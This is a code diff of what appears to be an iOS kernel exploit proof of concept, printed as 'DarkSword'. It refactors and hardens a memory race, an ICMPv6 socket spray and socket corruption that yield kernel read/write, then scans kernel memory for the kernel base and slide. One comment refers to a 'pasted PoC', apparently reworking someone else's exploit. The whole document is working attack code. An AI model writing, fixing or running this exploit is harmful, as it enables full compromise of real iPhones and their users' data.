@@ -155,17 +155,19 @@ void *free_thread(void *arg)
 	while (goSync != 0) {
 		while (raceSync == 0);
 
-		kern_return_t kr = mach_vm_map(mach_task_self(),
-									   &freeTarget,
-									   freeTargetSize,
-									   0,
-									   VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
-									   targetObject,
-									   targetObjectOffset,
-									   0,
-									   VM_PROT_DEFAULT,
-									   VM_PROT_DEFAULT,
-									   VM_INHERIT_NONE);
+		kern_return_t kr = mach_vm_map(
+			mach_task_self(),
+			(mach_vm_address_t *)&freeTarget,
+			freeTargetSize,
+			0,
+			VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+			targetObject,
+			targetObjectOffset,
+			0,
+			VM_PROT_DEFAULT,
+			VM_PROT_DEFAULT,
+			VM_INHERIT_NONE
+		);
 
 		if (kr != KERN_SUCCESS) {
 			printf("[-] mach_vm_map failed !!!\n");
@@ -180,20 +182,29 @@ void *free_thread(void *arg)
 	return NULL;
 }
 
-fileport_t spray_socket(NSMutableArray *socketPorts, NSMutableArray *socketPcbIds)
-{
+mach_port_t spray_socket(
+    NSMutableArray *socketPorts,
+    NSMutableArray *socketPcbIds
+){
 	int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
 	if (fd == -1) {
 		printf("[-] socket create failed!!!");
 		return fd;
 	}
 
-	fileport_t outputSocketPort = 0;
+	mach_port_t outputSocketPort = MACH_PORT_NULL;
 	fileport_makeport(fd, &outputSocketPort);
 	close(fd);
 
 	void *socketInfo = calloc(1, 0x400);
+
+	#pragma clang diagnostic push
+	#pragma clang diagnostic ignored "-Wdeprecated-declarations"
+
 	int r = syscall(336, 6, getpid(), 3, outputSocketPort, socketInfo, 0x400);
+
+	#pragma clang diagnostic pop
+
 	uint64_t inp_gencnt = *(uint64_t *)((uintptr_t)socketInfo + 0x110);
 
 	[socketPorts addObject:@(outputSocketPort)];
@@ -519,7 +530,9 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 				break;
 			}
 		}
-		int sock = fileport_makefd((fileport_t)socketPorts[controlSocketIdx].unsignedLongLongValue);
+		int sock = fileport_makefd(
+			(mach_port_t)socketPorts[controlSocketIdx].unsignedLongLongValue
+		);
 		socklen_t len = GETSOCKOPT_READ_LEN;
 		int res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockoptReadData, &len);
 		if (res != 0) {
@@ -530,7 +543,9 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		if (marker != -1) {
 			printf("[+] Found control_socket at idx: %u\n", controlSocketIdx);
 			controlSocket = sock;
-			rwSocket = fileport_makefd((fileport_t)socketPorts[controlSocketIdx + 1].unsignedLongLongValue);
+			rwSocket = fileport_makefd(
+				(mach_port_t)socketPorts[controlSocketIdx + 1].unsignedLongLongValue
+			);
 			return KERN_SUCCESS;
 		}
 		else {
@@ -680,64 +695,213 @@ uint64_t kernel_slide;
 
 int go(void)
 {
-	init_globals();
-	struct utsname name;
-	uname(&name);
+    init_globals();
 
-	isA18Device = (bool)strstr(name.machine, "iPhone17,");
+    struct utsname name;
 
-	if (isA18Device) {
-		printf("[+] Running on A18 device\n");
-		sleep(8);
-		pe_init();
-		pe_v2();
-	}
-	else {
-		printf("[+] Running on non-A18 device\n");
-		pe_init();
-		pe_v1();
-	}
-
-	printf("[+] highestSuccessIdx: %d\n", highestSuccessIdx);
-	printf("[+] successReadCount: %d\n", successReadCount);
-
-	goSync = 0;
-	raceSync = 1;
-	pthread_join(freeThread, NULL);
-	close(writeFd);
-	close(readFd); 
-
-	controlSocketPcb = early_kread64(rwSocketPcb + 0x20);
-	krw_sockets_leak_forever();
-
-	uint64_t socketPtr = early_kread64(controlSocketPcb + OFFSET_PCB_SOCKET); // inpcb->socket
-	//PRINT_VAR(socketPtr);
-	uint64_t protoPtr = early_kread64(socketPtr + OFFSET_SO_PROTO); // socket->so_proto
-	//PRINT_VAR(protoPtr);
-	uint64_t textPtr = __xpaci(early_kread64(protoPtr + OFFSET_PR_INPUT)); // protosw->pr_input
-	//PRINT_VAR(textPtr);
-
-    kernel_base = textPtr & 0xFFFFFFFFFFFFC000;
-    while (true) {
-		//PRINT_VAR(kernel_base);
-		if (early_kread64(kernel_base) == 0x100000cfeedfacf) {
-			if (@available(iOS 16.0, *)) {
-				if (early_kread64(kernel_base + 0x8) == 0xc00000002) {
-					break;
-				}
-			}
-			else {
-				break;
-			}
-		}
-		kernel_base -= PAGE_SIZE;
+    if (uname(&name) != 0) {
+        printf("[-] uname failed\n");
+        return errno ? errno : -1;
     }
-    kernel_slide = kernel_base - 0xfffffff007004000;
 
-	printf("early_kread64(%#llx) -> %#llx\n", kernel_base, early_kread64(kernel_base));
+    isA18Device =
+        (strstr(name.machine, "iPhone17,") != NULL);
 
-	printf("win??\n");
-	fflush(stdout); sleep(1);
+    if (isA18Device) {
+        printf("[+] Running on A18 device\n");
 
-	return 0;
+        /*
+         * Your pasted PoC has no pe_v2 implementation.
+         */
+        sleep(8);
+        pe_init();
+        pe_v2();
+
+        return KERN_NOT_SUPPORTED;
+    }
+
+    printf("[+] Running on non-A18 device\n");
+
+    pe_init();
+    pe_v1();
+
+    printf(
+        "[+] highestSuccessIdx: %d\n",
+        highestSuccessIdx
+    );
+
+    printf(
+        "[+] successReadCount: %d\n",
+        successReadCount
+    );
+
+    /*
+     * Stop the race/free thread before using the
+     * post-exploit primitive.
+     */
+    goSync = 0;
+    raceSync = 1;
+
+    int joinResult =
+        pthread_join(
+            freeThread,
+            NULL
+        );
+
+    if (joinResult != 0) {
+        printf(
+            "[-] pthread_join failed: %d\n",
+            joinResult
+        );
+        return joinResult;
+    }
+
+    if (writeFd >= 0) {
+        close(writeFd);
+        writeFd = -1;
+    }
+
+    if (readFd >= 0) {
+        close(readFd);
+        readFd = -1;
+    }
+
+    /*
+     * Establish the control socket PCB.
+     */
+    controlSocketPcb =
+        early_kread64(
+            rwSocketPcb + 0x20
+        );
+
+    if (!controlSocketPcb) {
+        printf(
+            "[-] controlSocketPcb is NULL\n"
+        );
+        return EFAULT;
+    }
+
+    krw_sockets_leak_forever();
+
+    /*
+     * Walk:
+     *
+     * inpcb -> socket -> so_proto -> pr_input
+     */
+    uint64_t socketPtr =
+        early_kread64(
+            controlSocketPcb +
+            OFFSET_PCB_SOCKET
+        );
+
+    if (!socketPtr) {
+        printf(
+            "[-] socketPtr is NULL\n"
+        );
+        return EFAULT;
+    }
+
+    uint64_t protoPtr =
+        early_kread64(
+            socketPtr +
+            OFFSET_SO_PROTO
+        );
+
+    if (!protoPtr) {
+        printf(
+            "[-] protoPtr is NULL\n"
+        );
+        return EFAULT;
+    }
+
+    uint64_t textPtr =
+        __xpaci(
+            early_kread64(
+                protoPtr +
+                OFFSET_PR_INPUT
+            )
+        );
+
+    if (!textPtr) {
+        printf(
+            "[-] textPtr is NULL\n"
+        );
+        return EFAULT;
+    }
+
+    /*
+     * Find kernel Mach-O header.
+     */
+    kernel_base =
+        textPtr &
+        0xFFFFFFFFFFFFC000ULL;
+
+    uint64_t scanCount = 0;
+
+    while (true) {
+        uint64_t magic =
+            early_kread64(kernel_base);
+
+        if (
+            magic ==
+            0x100000cfeedfacfULL
+        ) {
+            uint64_t hdr =
+                early_kread64(
+                    kernel_base + 0x8
+                );
+
+            if (
+                hdr == 0xc00000002ULL ||
+                hdr == 0xB00000000ULL
+            ) {
+                break;
+            }
+        }
+
+        /*
+         * Safety guard against an obviously bogus scan.
+         */
+        if (kernel_base <
+            0xffff000000000000ULL) {
+            printf(
+                "[-] kernel scan left expected VA range\n"
+            );
+            return EFAULT;
+        }
+
+        kernel_base -= PAGE_SIZE;
+
+        if (++scanCount >
+            0x100000) {
+            printf(
+                "[-] kernel scan exceeded limit\n"
+            );
+            return EFAULT;
+        }
+    }
+
+    kernel_slide =
+        kernel_base -
+        0xfffffff007004000ULL;
+
+    printf(
+        "[+] kernel_base = %#llx\n",
+        kernel_base
+    );
+
+    printf(
+        "[+] kernel_slide = %#llx\n",
+        kernel_slide
+    );
+
+    printf(
+        "[+] early_kread64(%#llx) -> %#llx\n",
+        kernel_base,
+        early_kread64(kernel_base)
+    );
+
+    printf("[+] DarkSword run succeeded\n");
+
+    return 0;
 }
